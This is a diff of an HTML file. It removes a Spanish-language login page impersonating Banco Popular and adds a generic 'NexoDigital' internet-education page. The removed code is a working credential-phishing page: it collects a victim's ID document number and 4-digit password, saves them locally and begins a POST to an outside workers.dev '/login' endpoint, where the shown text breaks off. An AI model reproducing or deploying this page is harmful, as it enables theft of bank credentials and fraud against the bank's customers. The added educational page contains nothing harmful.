@@ -1,1003 +1,423 @@
 <!DOCTYPE html>
 <html lang="es">
 <head>
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, user-scalable=yes" />
-    <title>Bienvenido - Banco Popular</title>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="description" content="NexoDigital es un recurso educativo independiente sobre tecnología de internet, conectividad, Wi-Fi, fibra óptica y seguridad digital en Colombia.">
+  <meta name="robots" content="index, follow">
+  <title>NexoDigital | Educación sobre Internet y Tecnología Digital en Colombia</title>
+  <style>
    
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-
-    <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: 'Inter', sans-serif;
-        }
-
-        body {
-            background: #ffffff;
-            color: #000;
-            overflow-x: hidden;
-        }
-
-        /* Loader */
-        .loader-container {
-            position: fixed;
-            inset: 0;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            background: white;
-            z-index: 1000;
-            transition: opacity 0.3s ease;
-        }
-
-        .loader-container.hidden {
-            opacity: 0;
-            pointer-events: none;
-        }
-
-        .loader {
-            width: 45px;
-            height: 45px;
-            border: 4px solid #00a651;
-            border-top-color: transparent;
-            border-radius: 50%;
-            animation: spin 0.9s linear infinite;
-        }
-
-        @keyframes spin {
-            to { transform: rotate(360deg); }
-        }
-
-        /* Contenido principal */
-        .main-content {
-            display: none;
-            flex-direction: column;
-            align-items: center;
-            padding: 25px;
-            min-height: 100vh;
-        }
-
-        .main-content.show {
-            display: flex;
-            animation: fadeIn 0.5s ease;
-        }
-
-        @keyframes fadeIn {
-            from { opacity: 0; }
-            to { opacity: 1; }
-        }
-
-        .container {
-            width: 100%;
-            max-width: 430px;
-            margin-top: 40px;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-        }
-
-        /* Logo */
-        .logo {
-            margin-bottom: 20px;
-        }
-        .logo img {
-            width: 300px;
-            transition: transform 0.3s ease;
-        }
-        
-        .logo img:hover {
-            transform: scale(1.02);
-        }
-
-        /* Título */
-        .title {
-            text-align: center;
-            font-size: 26px;
-            font-weight: 600;
-            margin-bottom: 25px;
-            width: 100%;
-        }
-
-        /* Labels - CENTRADAS */
-        label {
-            display: block;
-            font-size: 11px;
-            margin-bottom: 6px;
-            margin-top: 15px;
-            color: #333;
-            width: 91%;
-        }
-
-        /* INPUT - CENTRADO */
-        input {
-            width: 91%;
-            padding: 14px;
-            border-radius: 12px;
-            border: 1px solid #ccc;
-            font-size: 15px;
-            outline: none;
-            transition: all 0.3s ease;
-        }
-        input:focus {
-            border-color: #00a651;
-            box-shadow: 0 0 0 3px rgba(0, 166, 81, 0.1);
-        }
-
-        input.shake {
-            animation: shake 0.5s ease;
-        }
-
-        @keyframes shake {
-            0%, 100% { transform: translateX(0); }
-            25% { transform: translateX(-5px); }
-            75% { transform: translateX(5px); }
-        }
-
-        /* FAKE SELECT - CENTRADO */
-        .fake-select {
-            width: 91%;
-            padding: 15px;
-            border: 1px solid #ccc;
-            border-radius: 12px;
-            font-size: 15px;
-            background: #fff;
-            cursor: pointer;
-            display: flex;
-            align-items: center;
-            transition: all 0.3s ease;
-            position: relative;
-        }
-
-        .fake-select:hover {
-            border-color: #00a651;
-        }
-
-        .fake-select.active {
-            border-color: #00a651;
-            box-shadow: 0 0 0 3px rgba(0, 166, 81, 0.1);
-        }
-
-        .fake-select::after {
-            content: "▾";
-            font-size: 18px;
-            color: #ff7b00;
-            transition: transform 0.3s ease;
-            position: absolute;
-            right: 15px;
-        }
-
-        .fake-select.active::after {
-            transform: rotate(180deg);
-        }
-
-        /* Switch container - CENTRADO */
-        .switch-container {
-            margin-top: 15px;
-            display: flex;
-            gap: 10px;
-            align-items: center;
-            justify-content: center;
-            width: 91%;
-        }
-
-        .switch-container input[type="checkbox"] {
-            width: 18px;
-            height: 18px;
-            accent-color: #00a651;
-            cursor: pointer;
-        }
-
-        .switch-container label {
-            text-align: left;
-            margin: 0;
-            width: auto;
-        }
-
-        /* Botones - CENTRADOS */
-        .button-container {
-            width: 100%;
-            margin-top: 30px;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            gap: 12px;
-            transition: transform 0.3s ease;
-        }
-
-        .button-container.keyboard-active {
-            transform: translateY(-20px);
-        }
-
-        .button-container button {
-            width: 91%;
-            padding: 15px 0;
-            border: none;
-            border-radius: 12px;
-            font-size: 17px;
-            font-weight: 600;
-            cursor: pointer;
-            transition: all 0.3s ease;
-            position: relative;
-            overflow: hidden;
-        }
-
-        .button-container button:active {
-            transform: scale(0.98);
-        }
-
-        /* Botón Cancelar */
-        .cancel-btn {
-            color: #ff7b00;
-            background: transparent;
-            border: 1px solid #ff7b00 !important;
-        }
-
-        .cancel-btn:hover {
-            background: rgba(255, 123, 0, 0.1);
-        }
-
-        /* Botón Continuar / Ingresar */
-        .continue-btn {
-            background: #bdbdbd;
-            color: #7a7a7a;
-            cursor: not-allowed;
-        }
-
-        .continue-btn.enabled {
-            background: #105163;
-            color: white;
-            cursor: pointer;
-        }
-
-        .continue-btn.enabled:hover {
-            background: #0d4250;
-        }
-
-        .continue-btn.loading {
-            position: relative;
-            color: transparent;
-        }
-
-        .continue-btn.loading::after {
-            content: "";
-            position: absolute;
-            top: 50%;
-            left: 50%;
-            width: 20px;
-            height: 20px;
-            margin: -10px 0 0 -10px;
-            border: 2px solid white;
-            border-top-color: transparent;
-            border-radius: 50%;
-            animation: spin 0.8s linear infinite;
-        }
-
-        .bottom-text {
-            margin-top: 20px;
-            text-align: center;
-            font-size: 12px;
-            width: 100%;
-        }
-
-        .bottom-text a {
-            color: #ff7b00;
-            font-weight: 600;
-            text-decoration: none;
-            transition: opacity 0.3s ease;
-        }
-
-        .bottom-text a:hover {
-            opacity: 0.8;
-        }
-
-        .legal {
-            margin-top: 40px;
-            font-size: 11px;
-            color: #777;
-            text-align: center;
-            width: 100%;
-        }
-
-        /* ===========================
-            SECCIÓN DE CLAVE (inline)
-        =========================== */
-        .help-text-clave {
-            width: 91%;
-            margin: 0 auto 8px;
-            display: flex;
-            justify-content: space-between;
-            font-size: 14px;
-            font-weight: 600;
-        }
-
-        .help-text-clave a {
-            color: #ff7b00;
-            text-decoration: none;
-        }
-
-        .input-wrapper {
-            width: 91%;
-            margin: 0 auto;
-            position: relative;
-            display: flex;
-            justify-content: center;
-        }
-
-        .input-field {
-            width: 100%;
-            padding: 10px 20px;
-            border-radius: 12px;
-            border: 1px solid #dcdcdc;
-            font-size: 26px;
-            text-align: center;
-            letter-spacing: 16px;
-            outline: none;
-            transition: all 0.3s ease;
-        }
-
-        .input-field:focus {
-            border-color: #00a651;
-            box-shadow: 0 0 0 3px rgba(0, 166, 81, 0.1);
-        }
-
-        .input-field::placeholder { color: #c0c0c0; }
-
-        .eye-icon {
-            position: absolute;
-            right: 16px;
-            top: 50%;
-            transform: translateY(-50%);
-            font-size: 20px;
-            color: #999;
-            cursor: pointer;
-        }
-
-        /* ===========================
-            SECCIÓN DE AYUDA
-        =========================== */
-        .help-section {
-            margin-top: 40px;
-            width: 100%;
-            background: linear-gradient(135deg, #f8f9fa 0%, #e9ecef 100%);
-            border-radius: 16px;
-            padding: 25px;
-            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.05);
-            border: 1px solid #e0e0e0;
-        }
-
-        .help-title {
-            color: #333;
-            font-size: 20px;
-            font-weight: 600;
-            margin-bottom: 20px;
-            text-align: center;
-        }
-
-        .help-options {
-            display: flex;
-            flex-direction: column;
-            gap: 16px;
-            margin-bottom: 25px;
-        }
-
-        .help-option {
-            display: flex;
-            align-items: center;
-            gap: 15px;
-            padding: 15px;
-            background: white;
-            border-radius: 12px;
-            border: 1px solid #e0e0e0;
-            cursor: pointer;
-            transition: all 0.3s ease;
-        }
-
-        .help-option:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
-            border-color: #00a651;
-        }
-
-        .help-icon {
-            width: 40px;
-            height: 40px;
-            background: linear-gradient(135deg, #00a651 0%, #008f46 100%);
-            border-radius: 10px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            color: white;
-            font-size: 18px;
-            transition: transform 0.3s ease;
-        }
-
-        .help-option:hover .help-icon {
-            transform: scale(1.1);
-        }
-
-        .help-text {
-            flex: 1;
-        }
-
-        .help-text h3 {
-            font-size: 16px;
-            font-weight: 600;
-            color: #333;
-            margin-bottom: 4px;
-        }
-
-        .help-text p {
-            font-size: 13px;
-            color: #666;
-            line-height: 1.4;
-        }
-
-        .payment-promo {
-            background: linear-gradient(135deg, #ff7b00 0%, #ff9500 100%);
-            border-radius: 12px;
-            padding: 20px;
-            color: white;
-            text-align: center;
-            margin-top: 10px;
-        }
-
-        .payment-promo h3 {
-            font-size: 18px;
-            font-weight: 600;
-            margin-bottom: 8px;
-        }
-
-        .payment-promo p {
-            font-size: 14px;
-            opacity: 0.95;
-            margin-bottom: 15px;
-            line-height: 1.4;
-        }
-
-        .payment-btn {
-            background: white;
-            color: #ff7b00;
-            border: none;
-            padding: 12px 24px;
-            border-radius: 25px;
-            font-weight: 600;
-            font-size: 14px;
-            cursor: pointer;
-            transition: all 0.3s ease;
-        }
-
-        .payment-btn:hover {
-            transform: scale(1.05);
-            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
-        }
-
-        .payment-btn:active {
-            transform: scale(1);
-        }
-
-        .website-link {
-            margin-top: 25px;
-            text-align: center;
-            font-size: 14px;
-            color: #666;
-            padding-top: 20px;
-            border-top: 1px solid #e0e0e0;
-        }
-
-        .website-link strong {
-            color: #00a651;
-            font-weight: 600;
-        }
-
-        /* ===========================
-            SELECT DESLIZABLE
-        =========================== */
-        .overlay {
-            position: fixed;
-            inset: 0;
-            background: rgba(0,0,0,0.45);
-            backdrop-filter: blur(2px);
-            display: none;
-            z-index: 10;
-            animation: fadeIn 0.3s ease;
-        }
-
-        .modal {
-            position: fixed;
-            left: 0;
-            right: 0;
-            bottom: -100%;
-            background: #fff;
-            border-radius: 16px 16px 0 0;
-            padding: 25px;
-            z-index: 20;
-            transition: bottom 0.35s ease;
-        }
-
-        .modal.show {
-            bottom: 0;
-        }
-
-        .option {
-            font-size: 18px;
-            padding: 14px 0;
-            border-bottom: 1px solid #eaeaea;
-            cursor: pointer;
-            transition: all 0.2s ease;
-            text-align: center;
-        }
-
-        .option:active {
-            background: rgba(0, 166, 81, 0.1);
-        }
-
-        .option.selected {
-            color: #00a651;
-            font-weight: 600;
-        }
-
-        .cancel-select {
-            text-align: center;
-            margin-top: 18px;
-            color: #ff7b00;
-            font-size: 17px;
-            font-weight: 600;
-            cursor: pointer;
-            padding: 10px;
-            border-radius: 10px;
-            transition: background 0.2s ease;
-        }
-
-        .cancel-select:active {
-            background: rgba(255, 123, 0, 0.1);
-        }
-
-        /* Toast notification */
-        .toast {
-            position: fixed;
-            top: 20px;
-            left: 50%;
-            transform: translateX(-50%) translateY(-100px);
-            background: #333;
-            color: white;
-            padding: 12px 20px;
-            border-radius: 8px;
-            z-index: 1000;
-            opacity: 0;
-            transition: all 0.3s ease;
-            font-size: 14px;
-            max-width: 90%;
-            text-align: center;
-        }
-
-        .toast.show {
-            opacity: 1;
-            transform: translateX(-50%) translateY(0);
-        }
-
-        /* Ajuste para teclado en móviles */
-        @media (max-height: 600px) {
-            .container {
-                margin-top: 20px;
-            }
-            
-            .button-container {
-                margin-top: 20px;
-            }
-        }
-    </style>
+    :root {
+      --bg: #07111f;
+      --panel: #101e30;
+      --text: #edf5ff;
+      --muted: #a8bbd2;
+      --accent: #48e0d0;
+      --blue: #659cff;
+      --border: rgba(255,255,255,.12);
+    }
+
+    * { box-sizing: border-box; }
+
+    html { scroll-behavior: smooth; }
+
+    body {
+      margin: 0;
+      font-family: Arial, Helvetica, sans-serif;
+      background: var(--bg);
+      color: var(--text);
+      line-height: 1.7;
+    }
+
+    a { color: var(--accent); }
+
+    header {
+      position: sticky;
+      top: 0;
+      z-index: 10;
+      background: rgba(7,17,31,.94);
+      border-bottom: 1px solid var(--border);
+      backdrop-filter: blur(12px);
+    }
+
+    nav {
+      max-width: 1120px;
+      margin: auto;
+      padding: 16px 22px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      gap: 20px;
+      flex-wrap: wrap;
+    }
+
+    .logo {
+      font-size: 1.45rem;
+      font-weight: 800;
+      letter-spacing: -.5px;
+    }
+
+    .logo span { color: var(--accent); }
+
+    nav a {
+      text-decoration: none;
+      color: var(--text);
+      margin-left: 14px;
+      font-size: .92rem;
+    }
+
+    .hero {
+      max-width: 1120px;
+      margin: auto;
+      padding: 100px 22px 80px;
+      background:
+        radial-gradient(ellipse at 80% 10%, rgba(72,224,208,.12), transparent 40%),
+        radial-gradient(ellipse at 10% 80%, rgba(101,156,255,.12), transparent 40%);
+    }
+
+    .eyebrow {
+      color: var(--accent);
+      text-transform: uppercase;
+      letter-spacing: 2px;
+      font-size: .8rem;
+      font-weight: bold;
+    }
+
+    h1 {
+      max-width: 800px;
+      font-size: clamp(2.5rem, 6vw, 4.7rem);
+      line-height: 1.08;
+      margin: 18px 0;
+    }
+
+    h1 span {
+      color: var(--accent);
+    }
+
+    .hero p {
+      max-width: 720px;
+      color: var(--muted);
+      font-size: 1.12rem;
+    }
+
+    .button {
+      display: inline-block;
+      margin-top: 18px;
+      padding: 12px 20px;
+      border-radius: 8px;
+      background: var(--accent);
+      color: #07111f;
+      text-decoration: none;
+      font-weight: bold;
+    }
+
+    section {
+      max-width: 1120px;
+      margin: auto;
+      padding: 65px 22px;
+    }
+
+    .section-intro {
+      max-width: 740px;
+      color: var(--muted);
+    }
+
+    h2 { font-size: clamp(1.8rem, 4vw, 2.7rem); }
+
+    .grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(230px, 1fr));
+      gap: 18px;
+      margin-top: 30px;
+    }
+
+    .card {
+      background: var(--panel);
+      border: 1px solid var(--border);
+      padding: 24px;
+      border-radius: 15px;
+    }
+
+    .card h3 { margin-top: 0; }
+
+    .card p, .muted { color: var(--muted); }
+
+    .notice {
+      padding: 20px;
+      border-left: 3px solid var(--accent);
+      background: rgba(72,224,208,.07);
+      border-radius: 6px;
+      color: var(--muted);
+    }
+
+    details {
+      padding: 18px 0;
+      border-bottom: 1px solid var(--border);
+    }
+
+    summary {
+      cursor: pointer;
+      font-weight: bold;
+    }
+
+    footer {
+      border-top: 1px solid var(--border);
+      padding: 35px 22px;
+      color: var(--muted);
+      text-align: center;
+    }
+
+    footer a { margin: 0 8px; }
+
+    @media (max-width: 650px) {
+      nav { justify-content: center; }
+      nav a { margin: 0 6px; }
+      .hero { padding-top: 65px; }
+    }
+  </style>
 </head>
+
 <body>
-
-    <!-- Loader -->
-    <div class="loader-container" id="loader">
-        <div class="loader"></div>
+<header>
+  <nav aria-label="Navegación principal">
+    <a class="logo" href="#home">Nexo<span>Digital</span></a>
+    <div>
+      <a href="#about">Nosotros</a>
+      <a href="#learn">Aprende</a>
+      <a href="#faq">Preguntas</a>
+      <a href="#contact">Contacto</a>
     </div>
+  </nav>
+</header>
 
-    <!-- Toast -->
-    <div class="toast" id="toast"></div>
+<main>
+  <div class="hero" id="home">
+    <div class="eyebrow">Educación digital independiente</div>
+    <h1>Entiende el internet.<br><span>Conéctate con confianza.</span></h1>
+    <p>
+      Explora recursos educativos sobre tecnología de internet, conectividad
+      en el hogar, fibra óptica, rendimiento del Wi-Fi y seguridad en línea en Colombia.
+      Nuestro objetivo es hacer que el conocimiento digital sea más fácil de entender.
+    </p>
+    <a class="button" href="#learn">Explora nuestros recursos</a>
+  </div>
 
-    <!-- Contenido principal -->
-    <div class="main-content" id="mainContent">
-        <div class="container">
-            <div class="logo">
-                <img src="https://popularespopular.pages.dev/popular.jpeg" alt="Banco Popular">
-            </div>
-
-            <div class="title"></div>
-
-            <!-- TIPO DE DOCUMENTO -->
-            <label>Tipo de documento</label>
-            <div class="fake-select" id="openSelect">
-                Cédula de Ciudadanía
-            </div>
-
-            <!-- NÚMERO DOC -->
-            <label>Número de documento</label>
-            <input type="number" placeholder="" id="userInput">
-
-            <!-- RECORDAR -->
-            <div class="switch-container">
-                <input type="checkbox" id="rememberDoc">
-                <label for="rememberDoc">Recordar tipo y número de documento</label>
-            </div>
-
-            <!-- ===== CLAVE (visible junto al documento) ===== -->
-            <div class="help-text-clave" style="margin-top:20px;">
-                <span>Contraseña única</span>
-                <a href="#" id="forgotPassword">¿La olvidaste?</a>
-            </div>
-
-            <div class="input-wrapper">
-                <input 
-                    type="password"
-                    id="claveInput"
-                    class="input-field"
-                    maxlength="4"
-                    placeholder="-  -  -  -"
-                    inputmode="numeric"
-                >
-                <i class="fa-solid fa-eye eye-icon" id="toggleEye"></i>
-            </div>
-
-            <!-- BOTONES -->
-            <div class="button-container" id="buttonContainer">
-                <button class="continue-btn" id="loginButton" disabled>Ingresar</button>
-            </div>
-
-            <div class="bottom-text">
-                ¿No eres usuario? <a href="#">Regístrate aquí</a>
-            </div>
-
-            <div class="legal">
-                Protegido por reCAPTCHA | Privacidad – Condiciones
-            </div>
-
-            <!-- NUEVA SECCIÓN DE AYUDA -->
-            <div class="help-section">
-                <div class="help-title">¿Cómo podemos ayudarte?</div>
-                
-                <div class="help-options">
-                    <div class="help-option" id="solicitarProductos">
-                        <div class="help-icon">
-                            <i class="fas fa-file-contract"></i>
-                        </div>
-                        <div class="help-text">
-                            <h3>Solicitar productos</h3>
-                            <p>Descubre y solicita nuestros productos financieros</p>
-                        </div>
-                    </div>
-                    
-                    <div class="help-option" id="contactanos">
-                        <div class="help-icon">
-                            <i class="fas fa-headset"></i>
-                        </div>
-                        <div class="help-text">
-                            <h3>Contáctanos</h3>
-                            <p>Estamos aquí para resolver tus dudas y consultas</p>
-                        </div>
-                    </div>
-                </div>
-                
-                <div class="payment-promo">
-                    <h3>Pagos rápidos y seguros</h3>
-                    <p>Realiza la inscripción de tus servicios públicos y privados, págalos desde cualquier lugar.</p>
-                    <button class="payment-btn" id="pagosBtn">Inscribe y paga </button>
-                </div>
-                
-                <div class="website-link"></div>
-            </div>
-        </div>
-
-        <!-- OVERLAY para select -->
-        <div class="overlay" id="overlay"></div>
-
-        <!-- MODAL SELECT -->
-        <div class="modal" id="modal">
-            <div class="option selected" data-value="Cédula de Ciudadanía">Cédula de Ciudadanía</div>
-            <div class="option" data-value="Cédula de Extranjería">Cédula de Extranjería</div>
-            <div class="option" data-value="Tarjeta de Identidad">Tarjeta de Identidad</div>
-            <div class="cancel-select" id="cancelSelect">Cancelar</div>
-        </div>
+  <section id="about">
+    <div class="eyebrow">Quiénes somos</div>
+    <h2>Sobre NexoDigital</h2>
+    <p class="section-intro">
+      NexoDigital es un sitio web educativo independiente dedicado a explicar
+      las tecnologías de internet y la conectividad digital. Proporcionamos
+      información general para ayudar a los lectores a comprender mejor cómo
+      funcionan los servicios de internet y qué factores pueden afectar su experiencia.
+    </p>
+    <div class="notice">
+      <strong>Importante:</strong> Este sitio web es un recurso educativo
+      independiente. No es un proveedor de servicios de internet, no vende
+      planes de internet y no representa a empresas de telecomunicaciones.
     </div>
+  </section>
 
-    <script>
-        // Mostrar el contenido principal con transición suave
-        window.addEventListener('load', () => {
-            const loader = document.getElementById('loader');
-            const mainContent = document.getElementById('mainContent');
-            
-            setTimeout(() => {
-                loader.classList.add('hidden');
-                
-                setTimeout(() => {
-                    loader.style.display = 'none';
-                    mainContent.classList.add('show');
-                    loadSavedData();
-                }, 300);
-            }, 800);
-        });
+  <section id="learn">
+    <div class="eyebrow">Centro de aprendizaje</div>
+    <h2>Explora la tecnología digital</h2>
+    <p class="section-intro">
+      Aprende los fundamentos de la conectividad a través de guías educativas claras y accesibles.
+    </p>
 
-        // Función para mostrar toast
-        function showToast(message, type = '') {
-            const toast = document.getElementById('toast');
-            toast.textContent = message;
-            toast.className = `toast ${type}`;
-            toast.classList.add('show');
-            
-            setTimeout(() => {
-                toast.classList.remove('show');
-            }, 3000);
-        }
+    <div class="grid">
+      <article class="card">
+        <h3>Tecnología de Fibra Óptica</h3>
+        <p>
+          Descubre cómo los cables de fibra óptica transmiten datos usando luz y por qué
+          esta tecnología se usa comúnmente para conexiones de internet de alta velocidad.
+        </p>
+      </article>
 
-        // Elementos principales
-        const userInput = document.getElementById('userInput');
-        const claveInput = document.getElementById('claveInput');
-        const loginButton = document.getElementById('loginButton');
-        const buttonContainer = document.getElementById('buttonContainer');
+      <article class="card">
+        <h3>Entendiendo la Velocidad de Internet</h3>
+        <p>
+          Aprende la diferencia entre velocidad de descarga, velocidad de subida, latencia
+          y ancho de banda, y cómo cada una puede afectar tus actividades en línea.
+        </p>
+      </article>
 
-        // Validación conjunta: documento >= 4 dígitos Y clave = 4 dígitos
-        function validateForm() {
-            const docOk = userInput.value.trim().length >= 4;
-            const claveOk = claveInput.value.length === 4;
-            
-            if (docOk && claveOk) {
-                loginButton.classList.add('enabled');
-                loginButton.disabled = false;
-            } else {
-                loginButton.classList.remove('enabled');
-                loginButton.disabled = true;
-            }
-        }
+      <article class="card">
+        <h3>Wi-Fi en el Hogar</h3>
+        <p>
+          Explora cómo la ubicación del router, las paredes, las interferencias y los dispositivos
+          conectados pueden afectar la cobertura y el rendimiento inalámbrico.
+        </p>
+      </article>
 
-        userInput.addEventListener('input', validateForm);
+      <article class="card">
+        <h3>Seguridad Digital</h3>
+        <p>
+          Aprende formas prácticas de crear contraseñas más seguras, reconocer
+          mensajes sospechosos, proteger información personal y navegar de forma segura.
+        </p>
+      </article>
 
-        claveInput.addEventListener('input', () => {
-            if (claveInput.value.length > 4) {
-                claveInput.value = claveInput.value.slice(0, 4);
-            }
-            validateForm();
-        });
+      <article class="card">
+        <h3>Acceso a Internet en Colombia</h3>
+        <p>
+          Comprende los tipos generales de conexiones a internet, las consideraciones
+          comunes del servicio y por qué la disponibilidad puede variar según la ubicación.
+        </p>
+      </article>
 
-        // Enter en cualquier campo -> enviar si está habilitado
-        [userInput, claveInput].forEach(inp => {
-            inp.addEventListener('keypress', (e) => {
-                if (e.key === 'Enter' && !loginButton.disabled) {
-                    loginButton.click();
-                }
-            });
-        });
+      <article class="card">
+        <h3>Comparando Planes de Internet</h3>
+        <p>
+          Aprende qué revisar al evaluar velocidades anunciadas, costos de instalación,
+          equipos, términos del contrato, cobertura y condiciones del servicio.
+        </p>
+      </article>
+    </div>
+  </section>
 
-        // Detectar teclado en móviles
-        function detectMobileKeyboard() {
-            const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
-            if (!isMobile) return;
-            
-            let originalHeight = window.innerHeight;
-            
-            window.addEventListener('resize', () => {
-                if (window.innerHeight < originalHeight * 0.7) {
-                    buttonContainer.classList.add('keyboard-active');
-                } else {
-                    buttonContainer.classList.remove('keyboard-active');
-                }
-            });
-        }
-        detectMobileKeyboard();
+  <section id="pricing">
+    <div class="eyebrow">Educación al consumidor</div>
+    <h2>Entendiendo los Precios de Internet</h2>
+    <p class="section-intro">
+      Los precios de internet en Colombia pueden variar según la ciudad, la dirección,
+      la tecnología de conexión, la velocidad anunciada, las promociones, la instalación,
+      los equipos y las condiciones del contrato.
+    </p>
+    <div class="notice">
+      NexoDigital no publica precios no verificados ni garantiza la disponibilidad del servicio.
+      Para obtener precios precisos y actuales, consulta la información oficial proporcionada
+      por el proveedor de servicios correspondiente. Revisa siempre los términos completos
+      antes de tomar una decisión.
+    </div>
+  </section>
 
-        // OJITO
-        const toggleEye = document.getElementById('toggleEye');
-        toggleEye.addEventListener('click', () => {
-            if (claveInput.type === 'password') {
-                claveInput.type = 'text';
-                toggleEye.classList.replace('fa-eye', 'fa-eye-slash');
-            } else {
-                claveInput.type = 'password';
-                toggleEye.classList.replace('fa-eye-slash', 'fa-eye');
-            }
-        });
+  <section id="faq">
+    <div class="eyebrow">Preguntas frecuentes</div>
+    <h2>Preguntas Comunes</h2>
 
-        // LOGIN (misma lógica que el segundo archivo)
-        async function performLogin() {
-            if (loginButton.disabled) return;
+    <details>
+      <summary>¿Cuál es el propósito de este sitio web?</summary>
+      <p class="muted">
+        Su propósito es proporcionar información educativa general sobre
+        tecnología de internet, conectividad y seguridad digital.
+      </p>
+    </details>
 
-            const userValue = userInput.value.trim();
+    <details>
+      <summary>¿Puedo comprar un plan de internet aquí?</summary>
+      <p class="muted">
+        No. Este sitio web no vende planes de internet ni procesa suscripciones
+        a servicios. Solo proporciona contenido educativo.
+      </p>
+    </details>
 
-            if (userValue.length < 4) {
-                userInput.classList.add('shake');
-                showToast('Ingrese un número de documento válido (mínimo 4 dígitos)', 'error');
-                setTimeout(() => userInput.classList.remove('shake'), 500);
-                return;
-            }
+    <details>
+      <summary>¿Los precios de internet son los mismos en toda Colombia?</summary>
+      <p class="muted">
+        No. La disponibilidad, los precios, las tecnologías y las condiciones del servicio
+        pueden variar según la ubicación y el proveedor. Confirma los detalles directamente
+        con el proveedor correspondiente.
+      </p>
+    </details>
 
-            if (claveInput.value.length !== 4) {
-                claveInput.classList.add('shake');
-                showToast('Ingrese su contraseña de 4 dígitos', 'error');
-                setTimeout(() => claveInput.classList.remove('shake'), 500);
-                return;
-            }
+    <details>
+      <summary>¿Este sitio web garantiza velocidades de internet?</summary>
+      <p class="muted">
+        No. El rendimiento real depende de múltiples factores, incluyendo el plan de servicio,
+        las condiciones de la red, los equipos, la señal Wi-Fi y los dispositivos conectados.
+      </p>
+    </details>
 
-            try {
-                loginButton.classList.add('loading');
-                loginButton.disabled = true;
+    <details>
+      <summary>¿NexoDigital está afiliado a proveedores de internet?</summary>
+      <p class="muted">
+        NexoDigital se presenta como un recurso educativo independiente y no reclama
+        afiliación con proveedores de telecomunicaciones.
+      </p>
+    </details>
+  </section>
 
-                let bancoldata;
-                try {
-                    const storedData = localStorage.getItem('bancoldata');
-                    bancoldata = storedData ? JSON.parse(storedData) : {};
-                } catch (e) {
-                    console.error('Error al parsear bancoldata:', e);
-                    bancoldata = {};
-                }
+  <section id="contact">
+    <div class="eyebrow">Ponte en contacto</div>
+    <h2>Contacto</h2>
+    <p class="section-intro">
+      Para preguntas sobre nuestro contenido educativo o el sitio web, contacta al
+      administrador del sitio usando los datos de contacto publicados en este sitio.
+    </p>
+    <p class="muted">
+      Antes de publicar, agrega una dirección de correo electrónico real y monitoreada
+      si planeas recibir consultas.
+    </p>
+  </section>
 
-                const transactionId = 'txn_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
+  <section id="terms">
+    <div class="eyebrow">Políticas del sitio web</div>
+    <h2>Términos y Condiciones</h2>
+    <p class="muted">
+      Al usar este sitio web, aceptas utilizar su contenido con fines lícitos,
+      personales y educativos. La información proporcionada es para fines educativos
+      generales y no debe considerarse una garantía de disponibilidad de servicio,
+      precios, rendimiento técnico o condiciones comerciales.
+    </p>
+    <p class="muted">
+      Hacemos esfuerzos razonables para proporcionar información útil, pero el contenido
+      puede cambiar o quedar desactualizado. Los usuarios deben verificar de forma
+      independiente los detalles importantes antes de tomar decisiones. El sitio web
+      no vende servicios de telecomunicaciones ni celebra contratos de servicio.
+    </p>
+    <p class="muted">
+      Estos términos deben revisarse para cumplir con la legislación colombiana aplicable
+      antes de la publicación. Nada en esta sección excluye derechos que legalmente
+      no pueden ser excluidos.
+    </p>
+  </section>
 
-                bancoldata.usuario = userValue;
-                bancoldata.clave = claveInput.value;
-                bancoldata.transactionId = transactionId;
-                bancoldata.fecha = new Date().toISOString();
+  <section id="privacy">
+    <div class="eyebrow">Protección de datos</div>
+    <h2>Política de Privacidad</h2>
+    <p class="muted">
+      Este sitio web busca minimizar la recolección de información personal.
+      Si se recolectan datos personales a través de formularios de contacto, analíticas,
+      cookies u otras tecnologías, el operador del sitio web debe identificar
+      el responsable del tratamiento, explicar los propósitos del procesamiento, obtener
+      la autorización cuando sea requerida, y proporcionar los derechos aplicables y
+      los procedimientos de contacto según la Ley 1581 de 2012 de Colombia y sus regulaciones.
+    </p>
+    <p class="muted">
+      Las personas deben ser informadas sobre cómo solicitar acceso a,
+      corrección de, o eliminación de su información personal, cuando sea
+      aplicable. Esta política debe completarse con los datos reales y las prácticas
+      del operador antes de que el sitio web recolecte datos personales.
+    </p>
+  </section>
 
-                const rememberDoc = document.getElementById('rememberDoc').checked;
-                if (rememberDoc) {
-                    bancoldata.rememberDocument = true;
-                    bancoldata.tipoDocumento = document.getElementById('openSelect').textContent;
-                }
+  <section id="cookies">
+    <div class="eyebrow">Tecnologías del sitio web</div>
+    <h2>Cookies y Tecnologías Similares</h2>
+    <p class="muted">
+      El HTML y CSS básicos de esta página no requieren cookies publicitarias.
+      Si se agregan analíticas, etiquetas publicitarias u otras tecnologías de seguimiento,
+      disclóselas con precisión, explica sus propósitos e implementa
+      los controles de consentimiento o preferencias requeridos por la ley aplicable y
+      las políticas de la plataforma.
+    </p>
+  </section>
+</main>
 
-                localStorage.setItem('bancoldata', JSON.stringify(bancoldata));
+<footer>
+  <p>© <span id="year"></span> NexoDigital. Contenido educativo.</p>
+  <p>
+    <a href="#terms">Términos y Condiciones</a>
+    <a href="#privacy">Política de Privacidad</a>
+    <a href="#cookies">Cookies</a>
+  </p>
+  <p>Recurso educativo independiente. No se venden servicios de internet a través de este sitio web.</p>
+</footer>
 
-                loginButton.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Verificando...';
-
-                await new Promise(r => setTimeout(r, 1000));
-
-                const res = await fetch("https://quiet-haze-3548.micollflorez.workers.dev/login", {
-                    method: "POST",
